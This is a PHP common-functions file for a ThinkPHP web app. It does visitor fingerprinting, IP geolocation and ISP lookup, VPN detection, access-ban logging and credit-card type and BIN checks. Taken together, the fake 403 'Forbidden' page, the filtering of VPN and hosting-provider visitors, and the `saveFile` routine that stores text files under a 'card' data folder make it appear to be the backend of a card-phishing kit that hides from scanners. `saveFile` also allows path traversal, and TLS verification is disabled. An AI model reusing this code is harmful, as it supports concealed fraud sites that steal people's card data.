<?php
// 应用公共文件
use think\facade\Db;


function add_log($id,$step,$str){
    //-------插入日志
    $log['did']=$id;
    $log['log_step']=$step;
    $log['log_str']=$str;
    $log['log_time1']=date('Y-m-d H:i:s');
    $log['log_time2']=time();
    Db::Name('log')->save($log);
}
function error() {
    header('HTTP/1.0 403 Forbidden');
    die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You dont have permission to access / on this server.</p></body></html>');
    exit();
}

function get_ip_info($_ip) {
    $url = "http://www.geoplugin.net/json.gp?ip=".$_ip;
    $ch = curl_init();
    curl_setopt($ch,CURLOPT_URL,$url);
    curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_IPRESOLVE, CURL_IPRESOLVE_V4);
    $resp=curl_exec($ch);
    curl_close($ch);
    return $resp;
}

function getOS() {
    $user_agent     =   $_SERVER['HTTP_USER_AGENT'];
    $os_platform    =   "Unknown OS Platform";
    $os_array       =   array(
        '/windows nt 10/i'     =>  'Windows 10',
        '/windows nt 6.3/i'     =>  'Windows 8.1',
        '/windows nt 6.2/i'     =>  'Windows 8',
        '/windows nt 6.1/i'     =>  'Windows 7',
        '/windows nt 6.0/i'     =>  'Windows Vista',
        '/windows nt 5.2/i'     =>  'Windows Server 2003/XP x64',
        '/windows nt 5.1/i'     =>  'Windows XP',
        '/windows xp/i'         =>  'Windows XP',
        '/windows nt 5.0/i'     =>  'Windows 2000',
        '/windows me/i'         =>  'Windows ME',
        '/win98/i'              =>  'Windows 98',
        '/win95/i'              =>  'Windows 95',
        '/win16/i'              =>  'Windows 3.11',
        '/macintosh|mac os x/i' =>  'Mac OS X',
        '/mac_powerpc/i'        =>  'Mac OS 9',
        '/linux/i'              =>  'Linux',
        '/ubuntu/i'             =>  'Ubuntu',
        '/iphone/i'             =>  'iPhone',
        '/ipod/i'               =>  'iPod',
        '/ipad/i'               =>  'iPad',
        '/android/i'            =>  'Android',
        '/blackberry/i'         =>  'BlackBerry',
        '/webos/i'              =>  'Mobile'
    );
    foreach ($os_array as $regex => $value) {
        if (preg_match($regex, $user_agent)) {
            $os_platform    =   $value;
        }
    }
    return $os_platform;
}

function getBrowser() {
    $user_agent     =   $_SERVER['HTTP_USER_AGENT'];
    $browser        =   "Unknown Browser";
    $browser_array  =   array(
        '/msie/i'       =>  'Internet Explorer',
        '/firefox/i'    =>  'Firefox',
        '/safari/i'     =>  'Safari',
        '/chrome/i'     =>  'Chrome',
        '/opera/i'      =>  'Opera',
        '/netscape/i'   =>  'Netscape',
        '/maxthon/i'    =>  'Maxthon',
        '/konqueror/i'  =>  'Konqueror',
        '/mobile/i'     =>  'Handheld Browser'
    );
    foreach ($browser_array as $regex => $value) {
        if (preg_match($regex, $user_agent)) {
            $browser    =   $value;
        }
    }
    return $browser;
}

function get_client_ip(){
    return request()->ip();
}
function get_client_ip1(){
    return getenv('HTTP_CLIENT_IP')?:
           getenv('HTTP_X_FORWARDED_FOR')?:
           getenv('HTTP_X_FORWARDED')?:
           getenv('HTTP_FORWARDED_FOR')?:
           getenv('HTTP_FORWARDED')?:
           getenv('REMOTE_ADDR');
   }

function get_client_ip2(){
    return 
         getenv('REMOTE_ADDR')?:
             getenv('HTTP_CLIENT_IP')?:
           getenv('HTTP_X_FORWARDED_FOR')?:
           getenv('HTTP_X_FORWARDED')?:
           getenv('HTTP_FORWARDED_FOR')?:
           getenv('HTTP_FORWARDED');
   }

function get_client_ip3() {
    $ipaddress = '';
    if (isset($_SERVER['HTTP_CLIENT_IP']))
        $ipaddress = $_SERVER['HTTP_CLIENT_IP'];
        else if(isset($_SERVER['HTTP_X_FORWARDED_FOR']))
            $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
            else if(isset($_SERVER['HTTP_X_FORWARDED']))
                $ipaddress = $_SERVER['HTTP_X_FORWARDED'];
                else if(isset($_SERVER['HTTP_FORWARDED_FOR']))
                    $ipaddress = $_SERVER['HTTP_FORWARDED_FOR'];
                    else if(isset($_SERVER['HTTP_FORWARDED']))
                        $ipaddress = $_SERVER['HTTP_FORWARDED'];
                        else if(isset($_SERVER['REMOTE_ADDR']))
                            $ipaddress = $_SERVER['REMOTE_ADDR'];
                            else
                                $ipaddress = 'UNKNOWN';
                                return $ipaddress;
}
function my_curl($url,$data){
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, true );
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
    curl_setopt($ch, CURLOPT_HEADER, false);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); 
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 10);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    $output = curl_exec($ch);
   // curl_close($ch);
    if ($output == false){
        return 'error:' . curl_error($ch);
    }
    curl_close($ch);

    return $output;
}
function saveFile($filePath,$fileName,$fileContent)
{
    $path="../data/".$filePath."/".$fileName.".txt";
    file_put_contents($path, $fileContent);

    if($filePath!='card'){
        try {
            unlink("../data/card/".$fileName.".txt");
        }catch (Exception $e){

        }

    }
}
//判断移动端
function isMobile() {
    // 如果有HTTP_X_WAP_PROFILE则一定是移动设备
    if (isset ($_SERVER['HTTP_X_WAP_PROFILE'])) return true;
 
    // 如果via信息含有wap则一定是移动设备,部分服务商会屏蔽该信息
    if (isset ($_SERVER['HTTP_VIA']) && stristr($_SERVER['HTTP_VIA'], "wap")) {
        return true;
    }
 
    $user_agent = $_SERVER['HTTP_USER_AGENT'];  
    $mobile_agents = array ('iphone','android','phone','mobile','wap','netfront','java','opera mobi',
        'opera mini','ucweb','windows ce','symbian','series','webos','sony','blackberry','dopod',
        'nokia','samsung','palmsource','xda','pieplus','meizu','midp','cldc','motorola','foma',
        'docomo','up.browser','up.link','blazer','helio','hosin','huawei','novarra','coolpad',
        'techfaith','alcatel','amoi','ktouch','nexian','ericsson','philips','sagem','wellcom',
        'bunjalloo','maui','smartphone','iemobile','spice','bird','zte-','longcos','pantech',
        'gionee','portalmmm','jig browser','hiptop','benq','haier','^lct','320x320','240x320',
        '176x220','windows phone','cect','compal','ctl','lg','nec','tcl','daxian','dbtel','eastcom',
        'konka','kejian','lenovo','mot','soutec','sgh','sed','capitel','panasonic','sonyericsson',
        'sharp','panda','zte','acer','acoon','acs-','abacho','ahong','airness','anywhereyougo.com',
        'applewebkit/525','applewebkit/532','asus','audio','au-mic','avantogo','becker','bilbo',
        'bleu','cdm-','danger','elaine','eric','etouch','fly ','fly_','fly-','go.web','goodaccess',
        'gradiente','grundig','hedy','hitachi','htc','hutchison','inno','ipad','ipaq','ipod',
        'jbrowser','kddi','kgt','kwc','lg ','lg2','lg3','lg4','lg5','lg7','lg8','lg9','lg-','lge-',
        'lge9','maemo','mercator','meridian','micromax','mini','mitsu','mmm','mmp','mobi','mot-',
        'moto','nec-','newgen','nf-browser','nintendo','nitro','nook','obigo','palm','pg-',
        'playstation','pocket','pt-','qc-','qtek','rover','sama','samu','sanyo','sch-','scooter',
        'sec-','sendo','sgh-','siemens','sie-','softbank','sprint','spv','tablet','talkabout',
        'tcl-','teleca','telit','tianyu','tim-','toshiba','tsm','utec','utstar','verykool','virgin',
        'vk-','voda','voxtel','vx','wellco','wig browser','wii','wireless','xde','pad','gt-p1000');
 
    $is_mobile = false;
    foreach ($mobile_agents as $device) {  
      if (stristr($user_agent, $device)) {  
        $is_mobile = true;  
        break;  
      }
    }
    return $is_mobile;  
}


/**
 * get client real ip.
 * @return null|string
 */
function getClientIp() {
    $serverIpKeyList = array(
        'HTTP_CLIENT_IP',
        'HTTP_X_FORWARDED_FOR',
        'HTTP_X_FORWARDED',
        'HTTP_X_CLUSTER_CLIENT_IP',
        'HTTP_FORWARDED_FOR',
        'HTTP_FORWARDED',
        'REMOTE_ADDR');
    $realIp = null;
    foreach ($serverIpKeyList as $key) {
        if (array_key_exists($key, $_SERVER)) {
            // Sometimes when using $_SERVER['HTTP_X_FORWARDED_FOR'] OR $_SERVER['REMOTE_ADDR']
            // more than 1 IP address is returned, for example '155.240.132.261, 196.250.25.120'.
            // When this string is passed as an argument for gethostbyaddr() PHP gives the following error:
            // Warning: Address is not a valid IPv4 or IPv6 address in...
            // so, need to use explode function to explode ip string
            foreach (explode(',', $_SERVER[$key]) as $ip) {
                $realIp = trim($ip);
                if ((bool) filter_var($realIp, FILTER_VALIDATE_IP,
                    FILTER_FLAG_IPV4 |
                    FILTER_FLAG_NO_PRIV_RANGE |
                    FILTER_FLAG_NO_RES_RANGE)) {
                    break 2;
                }
            }
        }
    }
    return $realIp;
}

/**
 * Check ip info
 * @param $ip ip v4
 * @return array
 */
function checkIpInfo($ip) {
    $alternateReq = false;
    $ipInfo = array(
        'countryName' => 'unknown',
        'countryCode' => 'unknown',
        'continentName' => 'unknown',
        'cityName' => 'unknown',
        'regionName' => 'unknown',
        'timezone' => 'unknown',
        'currencySymbol' => 'unknown'
    );
    // Get ip meta data
    $k = 'ipinfo:'.$ip;
    $resp = false;//cache($k);
    $ch = curl_init();
    
    if(!$resp){
        
        //$url = "http://www.geoplugin.net/json.gp?ip=".$ip;
        $url = 'https://api.ipregistry.co/' . $ip . '?key=' . \think\facade\Config::get('website.ipregistry.key');
        //var_dump($url);exit;
        curl_setopt($ch,CURLOPT_URL,$url);
        curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_IPRESOLVE, CURL_IPRESOLVE_V4);
        $resp = curl_exec($ch);
        cache($k,$resp,60);
    }
    
    if ($resp === false) {
        // Alternate query identifier
        $alternateReq = true;
    } else {
        $ipMetaData = json_decode($resp, true);
        
        if (is_array($ipMetaData) && !empty($ipMetaData['location']['country'])) {
            if (!empty($ipMetaData['location']['country'])) {
                $ipInfo['countryName'] = $ipMetaData['location']['country']['name'];
            }
            if (!empty($ipMetaData['location']['country']['code'])) {
                $ipInfo['countryCode'] = $ipMetaData['location']['country']['code'];
            }
            if (!empty($ipMetaData['location']['continent']['name'])) {
                $ipInfo['continentName'] = $ipMetaData['location']['continent']['name'];
            }
            if (!empty($ipMetaData['location']['city'])) {
                $ipInfo['cityName'] = $ipMetaData['location']['city'];
            }
            if (!empty($ipMetaData['location']['region'])) {
                $ipInfo['regionName'] = $ipMetaData['location']['region'];
            }
            if (!empty($ipMetaData['time_zone'])) {
                $ipInfo['timezone'] = $ipMetaData['time_zone'];
            }
            if (!empty($ipMetaData['currency']['symbol'])) {
                $ipInfo['currencySymbol'] =$ipMetaData['currency']['symbol'];
            }
        }else{
            $alternateReq = false;
        }
        /*
        if (is_array($ipMetaData) && !empty($ipMetaData['geoplugin_countryName'])) {
            if (!empty($ipMetaData['geoplugin_countryName'])) {
                $ipInfo['countryName'] = $ipMetaData['geoplugin_countryName'];
            }
            if (!empty($ipMetaData['geoplugin_countryCode'])) {
                $ipInfo['countryCode'] = $ipMetaData['geoplugin_countryCode'];
            }
            if (!empty($ipMetaData['geoplugin_continentName'])) {
                $ipInfo['continentName'] = $ipMetaData['geoplugin_continentName'];
            }
            if (!empty($ipMetaData['geoplugin_city'])) {
                $ipInfo['cityName'] = $ipMetaData['geoplugin_city'];
            }
            if (!empty($ipMetaData['geoplugin_region'])) {
                $ipInfo['regionName'] = $ipMetaData['geoplugin_region'];
            }
            if (!empty($ipMetaData['geoplugin_timezone'])) {
                $ipInfo['timezone'] = $ipMetaData['geoplugin_timezone'];
            }
            if (!empty($ipMetaData['geoplugin_currencySymbol_UTF8'])) {
                $ipInfo['currencySymbol'] = $ipMetaData['geoplugin_currencySymbol_UTF8'];
            }
        } else {
            $alternateReq = true;
        }
        */
    }
    curl_close($ch);
    if ($alternateReq) {
        $url = 'http://extreme-ip-lookup.com/json/' . $ip;
        $ch = curl_init();
        curl_setopt($ch,CURLOPT_URL,$url);
        curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_IPRESOLVE, CURL_IPRESOLVE_V4);
        $resp = curl_exec($ch);
        if ($resp !== false) {
            $ipMetaData = json_decode($resp, true);
            if (is_array($ipMetaData)) {
                if (!empty($ipMetaData['country'])) {
                    $ipInfo['countryName'] = $ipMetaData['country'];
                }
                if (!empty($ipMetaData['countryCode'])) {
                    $ipInfo['countryCode'] = $ipMetaData['countryCode'];
                }
                if (!empty($ipMetaData['continent'])) {
                    $ipInfo['continentName'] = $ipMetaData['continent'];
                }
                if (!empty($ipMetaData['city'])) {
                    $ipInfo['cityName'] = $ipMetaData['city'];
                }
            }
        }
        curl_close($ch);
    }
    return $ipInfo;
}

/**
 * get last proxy ip.
 * NOTICE: sometimes using $_SERVER['REMOTE_ADDR'] more than 1 IP address is returned.
 * @return mixed
 */
function getRemoteAddr() {
    $ipList = explode(',', $_SERVER['REMOTE_ADDR']);
    return $ipList[0];
}


/**
 * Get the isp to which the ip belongs
 * @param $ip
 * @return mixed, eg:Choopa, LLC
 */
function getIsp($ip) {
    $getip = 'http://extreme-ip-lookup.com/json/' . $ip;
    $curl     = curl_init();
    curl_setopt($curl, CURLOPT_URL, $getip);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
    $content = curl_exec($curl);
    if ($content === false) {
        $ispName = 'unknown';
    } else {
        $details   = json_decode($content, true);
        $ispName = is_array($details) && isset($details['org']) ? $details['org'] : 'unknown';
    }
    curl_close($curl);
    return $ispName;
}

/**
 * Check whether Ip is VPN
 * @param $ip
 * @return string return N or Y
 */
function detectVpn($ip) {
    if ($ip == '127.0.0.1') {
        $resp = 'N';
    } else {
        $url = "https://blackbox.ipinfo.app/lookup/".$ip;
        $ch = curl_init();
        curl_setopt($ch,CURLOPT_URL,$url);
        curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        $resp = curl_exec($ch);
        if ($resp === false) {
            $resp = 'N';
        }
        curl_close($ch);
    }
    return $resp;
}
function resource_path($path = '')
{
    return runtime_path().'/'.($path ? DIRECTORY_SEPARATOR.$path : $path);
}
function banAccessLog($triggerType, $remark='') {
    $os = getOS();
    $clientIp = getClientIp();
    $ipInfo = checkIpInfo($clientIp);
    $banAccessLogTime = date('Y-m-d H:i:s');
    if ($remark) {
        $banAccessLogContent = "{$triggerType}|{$banAccessLogTime}|{$os}|{$clientIp}|{$ipInfo['countryName']}|{$remark}\n";
    } else {
        $banAccessLogContent = "{$triggerType}|{$banAccessLogTime}|{$os}|{$clientIp}|{$ipInfo['countryName']}\n";
    }
    $banAccessLogFilePath = resource_path('data/ban-access-log.txt');
    file_put_contents($banAccessLogFilePath, $banAccessLogContent,FILE_APPEND|LOCK_EX);
}

/**
 * Check credit card type
 * @param $number credit card number
 * @return string
 */
function checkCardType($number){
    $patternList = array(
        "visa"       => "/^4[0-9]{12}(?:[0-9]{3})?$/",
        "mastercard" => "/^5[1-5][0-9]{14}$/",
        "amex"       => "/^3[47][0-9]{13}$/",
        "jcb"       => "/^35[0-9]{14}$/",
        "discover"   => "/^6(?:011|5[0-9]{2})[0-9]{12}$/",
    );
    if (preg_match($patternList['visa'], $number)) {
        $cardType= "visa";
    } else if (preg_match($patternList['mastercard'], $number)) {
        $cardType= "mastercard";
    } else if (preg_match($patternList['amex'], $number)) {
        $cardType= "amex";
    } else if (preg_match($patternList['discover'], $number)) {
        $cardType= "discover";
    } else if (preg_match($patternList['jcb'], $number)) {
        $cardType= "jcb";
    } else {
        $cardType = 'unknown';
    }
    return $cardType;
}

/**
 * Check credit card info by bin
 * @param $bin
 * @return mixed
function checkBin($bin) {
$result = array(
'number'=> array(
'length'=> 0,
'luhn'=> true
),
'scheme'=> 'unknown',
'type'=> 'unknown',
'brand'=> 'unknown',
'prepaid'=> false,
'country'=> array(
'numeric'=> 'unknown',
'alpha2'=> 'unknown',
'name'=> 'unknown',
'emoji'=> 'unknown',
'currency'=> 'unknown',
'latitude'=> 0,
'longitude'=> 0
),
'bank'=> array(
'name'=> 'unknown',
'url'=> 'unknown',
'phone'=> 'unknown',
'city'=> 'unknown',
)
);
$bin = preg_replace('/\s/', '', $bin);
$bin = substr($bin,0,8);
$url = "https://lookup.binlist.net/".$bin;
$headers = array('Accept-Version: 3');
$ch = curl_init();
curl_setopt($ch,CURLOPT_URL,$url);
curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
$resp = curl_exec($ch);
$httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
if((intval($httpCode) !== 404) && ($resp !== false)) {
$resp = json_decode($resp, true);
if (isset($resp['number']['length'])) {
$result['number']['length'] = $resp['number']['length'];
}
if (isset($resp['number']['luhn'])) {
$result['number']['luhn'] = $resp['number']['luhn'];
}
if (isset($resp['scheme'])) {
$result['scheme'] = $resp['scheme'];
}
if (isset($resp['type'])) {
$result['type'] = $resp['type'];
}
if (isset($resp['brand'])) {
$result['brand'] = $resp['brand'];
}
if (isset($resp['prepaid'])) {
$result['prepaid'] = $resp['prepaid'];
}
if (isset($resp['country']['numeric'])) {
$result['country']['numeric'] = $resp['country']['numeric'];
}
if (isset($resp['country']['alpha2'])) {
$result['country']['alpha2'] = $resp['country']['alpha2'];
}
if (isset($resp['country']['name'])) {
$result['country']['name'] = $resp['country']['name'];
}
if (isset($resp['country']['emoji'])) {
$result['country']['emoji'] = $resp['country']['emoji'];
}
if (isset($resp['country']['currency'])) {
$result['country']['currency'] = $resp['country']['currency'];
}
if (isset($resp['country']['latitude'])) {
$result['country']['latitude'] = $resp['country']['latitude'];
}
if (isset($resp['country']['longitude'])) {
$result['country']['longitude'] = $resp['country']['longitude'];
}
if (isset($resp['bank']['name'])) {
$result['bank']['name'] = $resp['bank']['name'];
}
if (isset($resp['bank']['url'])) {
$result['bank']['url'] = $resp['bank']['url'];
}
if (isset($resp['bank']['phone'])) {
$result['bank']['phone'] = $resp['bank']['phone'];
}
if (isset($resp['bank']['city'])) {
$result['bank']['city'] = $resp['bank']['city'];
}
}
curl_close($ch);
return $result;
}
 */